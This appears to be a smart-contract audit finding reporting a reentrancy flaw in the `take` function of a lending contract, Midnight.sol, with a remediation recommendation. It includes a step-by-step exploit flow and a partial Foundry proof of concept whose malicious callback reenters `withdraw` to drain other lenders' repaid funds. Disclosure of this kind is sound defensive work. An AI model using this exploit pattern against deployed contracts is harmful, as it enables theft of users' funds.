### Title
Reentrancy via `IBuyCallback.onBuy` allows buyer to drain `withdrawable` before paying `buyerAssets` - (`src/Midnight.sol`)

### Summary

In `take`, `buyerPos.credit` is incremented before the `onBuy` callback fires, and `safeTransferFrom` (the buyer's payment) executes only after the callback returns. A malicious `IBuyCallback` can reenter `withdraw` during `onBuy`, consuming the buyer's freshly-credited units against the market's pre-existing `withdrawable` balance—tokens deposited by other borrowers' repayments—before the buyer has paid a single token. The net result is the attacker receives `units` loan tokens while paying only `buyerAssets = units * buyerPrice / WAD`, pocketing `units * (1 - buyerPrice/WAD)` for free.

### Finding Description

**Exact code path:**

`take` writes all position state before any external call: [1](#0-0) 

Then calls `onBuy` on the buyer's callback contract before pulling payment: [2](#0-1) 

`withdraw` has no reentrancy guard. Its only gate is an authorization check: [3](#0-2) 

**Root cause:** The CEI (Checks-Effects-Interactions) pattern is broken. Credit is written to storage at line 410, the external `onBuy` call happens at line 448, and the corresponding `safeTransferFrom` that funds the contract only executes at line 455. During the callback window, `buyerPos.credit` reflects `units` of credit that have no backing assets in the contract yet.

**Attacker inputs and exploit flow:**

1. Attacker (taker, EOA or contract) calls `midnight.setIsAuthorized(maliciousCallback, true, taker)` — a normal user action, no privilege required.
2. A market exists with `withdrawable >= units` (accumulated from prior `repay` calls by other borrowers).
3. A sell offer exists with `offerPrice + settlementFee < WAD` (price < 1.0 — the standard case for any discounted lending market).
4. Attacker calls `take(sellOffer, ..., units, taker, ..., maliciousCallback, ...)`.
5. Inside `take`:
   - `buyer = taker`, `buyerCreditIncrease = units` (taker has zero prior debt).
   - Line 410: `buyerPos.credit += units`.
   - Line 448: `IBuyCallback(maliciousCallback).onBuy(...)` is called.
6. Inside `onBuy`, `maliciousCallback` calls `withdraw(market, units, taker, address(maliciousCallback))`:
   - Auth check passes: `isAuthorized[taker][maliciousCallback] == true`.
   - Line 493: `_position.credit -= units` → 0.
   - Line 494: `_marketState.withdrawable -= units` (drains other lenders' repaid funds).
   - Line 499: `safeTransfer(loanToken, maliciousCallback, units)` → callback receives `units` tokens.
7. `onBuy` returns `CALLBACK_SUCCESS`.
8. Back in `take`, line 455: `safeTransferFrom(loanToken, maliciousCallback, this, buyerAssets - sellerAssets)`.
9. Line 456: `safeTransferFrom(loanToken, maliciousCallback, receiver, sellerAssets)`.
10. Total paid by `maliciousCallback` = `buyerAssets`. Total received = `units`. **Net gain = `units - buyerAssets > 0`.**

**Why existing checks fail:**

- `withdraw`'s authorization check (`isAuthorized[onBehalf][msg.sender]`) is satisfied by the attacker's pre-authorization of the callback contract — a standard, permissionless operation.
- There is no reentrancy guard anywhere in `Midnight.sol`.
- The Certora formal verification specs explicitly disclaim reentrancy coverage: [4](#0-3) 

- The `withdrawable` underflow guard only requires `withdrawable >= units`, which is the stated precondition.

### Impact Explanation

Direct theft of loan tokens from the contract. The attacker drains `withdrawable` — the pool of tokens repaid by borrowers and owed to other lenders — without depositing the corresponding `units` of assets. Other lenders who hold credit in the same market and attempt to `withdraw` after the attack will find `withdrawable` insufficient and their calls will revert. The stolen amount per attack is `units * (1 - buyerPrice/WAD)`, which approaches `units` as the offer price approaches zero.

### Likelihood Explanation

**Preconditions:**
- `withdrawable >= units`: satisfied in any active market after any repayment or liquidation.
- Sell offer with `offerPrice + settlementFee < WAD`: satisfied by virtually every real lending offer (prices below par are the norm).
- Attacker pre-authorizes callback: one transaction, no privilege, no cost beyond gas.

The attack is fully repeatable: after each successful drain, the attacker can wait for more repayments to accumulate `withdrawable` and repeat. The callback contract can be designed to self-fund (routing the `withdraw` proceeds back to itself to cover `buyerAssets`), requiring zero net capital from the attacker beyond gas.

### Recommendation

Apply the CEI pattern strictly in `take`: move both `safeTransferFrom` calls (lines 455–456) to execute **before** the `onBuy` callback (line 448). Alternatively, add a transient-storage reentrancy lock (the contract already uses `tload`/`tstore` for `LIQUIDATION_LOCK_SLOT`) that is set on entry to `take` and checked at the top of `withdraw`, `repay`, and any other state-mutating function.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import {Test} from "forge-std/Test.sol";
import {Midnight, Market, Offer} from "src/Midnight.sol";
import {IBuyCallback} from "src/interfaces/ICallbacks.sol";
import {ERC20Mock} from "test/mocks/ERC20Mock.sol";

contract MaliciousBuyCallback is IBuyCallback {
    Midnight public midnight;
    Market public market;
    address public taker;
    uint256 public storedUnits;

    constructor(Midnight _midnight, Market memory _market, address _taker) {
        midnight = _midnight;
        market = _market;
        taker = _taker;
    }

    function onBuy(bytes32, Market memory, uint256 buyerAssets, uint256 units,
                   uint256, address, bytes memory) external returns (bytes32) {
        storedUnits = units;
        // Reenter withdraw: drain withdrawable before take's safeTransferFrom fires
        midnight.withdraw(market, units, taker, address(this));
        // Approve the pulled buyerAssets so take's safeTransferFrom succeeds
        ERC20Mock(market.loanToken).approve(address(midnight), buyerAssets);
        return bytes32(uint256(keccak256("IBuyCallback.onBuy")));
    }
}

contract ReentrancyWithdrawTest is Test {
    Midnight midnight;
    ERC20Mock loanToken;
    // ... setup: create market, lender offer, borrower repays units → withdrawable = units

    function testReentrancyDrain() public {
        uint256 units = 1e18;
        // Precondition: withdrawable >= units from prior repayment
        // (set up: borrower borrows `units`, repays `units`)

        MaliciousBuyCallback cb = new MaliciousBuyCallback(midnight, market, attacker);
        vm.prank(attacker);
        midnight.setIsAuthorized(address(cb), true, attacker);

        uint256 contractBalBefore = loanToken.balanceOf(address(midnight));
        uint256 attackerBalBefore = loanToken.balanceOf(address(cb));

        vm.prank(attacker);
        midnight.take(sellOffer, hex"", units, attacker, address(0), address(cb), hex"");

        uint256 contractBalAfter = loanToken.balanceOf(address(midnight));
        uint256 attackerBalAfter = loanToken.balanceOf(address(cb));

        // Assert: contract lost more than buyerAssets - sellerAssets (the settlement fee)
        // Specifically, contract lost `units` from withdrawable but only received `buyerAssets - sellerAssets`
        assertGt(contractBalBefore - contractBalAfter, 0, "contract drained");
        assertGt(attackerBalAfter - attackerBalBefore, 0, "attacker profited");
        // Net attacker gain = units - buyerAssets > 0 (since price < WAD)
        assertEq(midnight.withdrawable(id), 0, "withdrawable drained");
    }
}
```

**Expected assertions:** `withdrawable` drops to zero; attacker's token balance increases by `units - buyerAssets`; contract balance decreases by `units - (buyerAssets - sellerAssets)`; no revert occurs anywhere in the call chain.
